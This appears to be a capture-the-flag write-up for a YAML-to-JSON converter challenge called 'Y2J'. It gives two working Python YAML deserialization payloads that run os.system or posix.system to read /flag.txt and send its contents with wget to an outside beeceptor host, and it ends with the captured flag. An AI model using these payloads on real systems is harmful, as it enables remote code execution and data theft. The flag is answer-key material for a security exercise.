# Y2J

![image](https://github.com/user-attachments/assets/d16b8f9c-f146-4540-ad18-061143c10f05)

## My Solution

When accessing the page we have only one functionality, to convert Yaml to Json.

![image](https://github.com/user-attachments/assets/9ee0f4b2-703e-454d-b41d-82824a3fe52d)

This is a classic case of python Yaml deserialization. We can get the flag in a number of ways:  

Example 1:  

```python
!!python/object/apply:os.system
- !!python/str "wget https://lazytitan33.free.beeceptor.com/?f=`cat /flag.txt`"
```

Example 2:  

```python
!!python/object/apply:posix.system
- wget https://lazytitan33.free.beeceptor.com/?f=`cat /flag.txt`
```

`flag{b20870a1955ac22377045e3b2dcb832a}`
